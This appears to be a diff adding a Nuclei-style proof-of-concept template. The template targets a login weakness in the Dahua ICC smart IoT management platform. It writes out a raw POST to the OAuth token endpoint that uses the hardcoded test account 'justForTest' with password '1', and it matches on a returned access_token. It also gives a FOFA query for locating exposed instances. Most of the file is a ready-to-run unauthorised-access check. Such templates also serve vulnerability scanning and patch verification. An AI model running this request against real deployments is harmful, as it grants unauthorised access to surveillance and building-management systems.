@@ -1,0 +1,48 @@
+id: poc-krvqa36ac2sux7ae
+info:
+  name: 大华智能物联综合管理平台ICC justForTest用户登录漏洞
+  author: hacktwo
+  severity: medium
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/krvqa36ac2sux7ae'
+  tags: other,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: krvqa36ac2sux7ae
+    fofa: body="*客户端会小于800*"
+http:
+- raw:
+  - 'POST /evo-apigw/evo-oauth/oauth/token HTTP/1.1
+
+
+    Content-Type: application/x-www-form-urlencoded
+
+
+    Accept-Encoding: gzip
+
+
+    Connection: close
+
+
+
+
+    username=justForTest&password=1&grant_type=password&client_id=web_client&client_secret=web_client&public_key=
+
+
+    # 响应代码特征
+
+    200
+
+
+    # 响应内容特征
+
+    ^(?=.*?success)(?=.*?access_token).*?$
+
+
+    # 上传文件定位
+
+    暂无'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
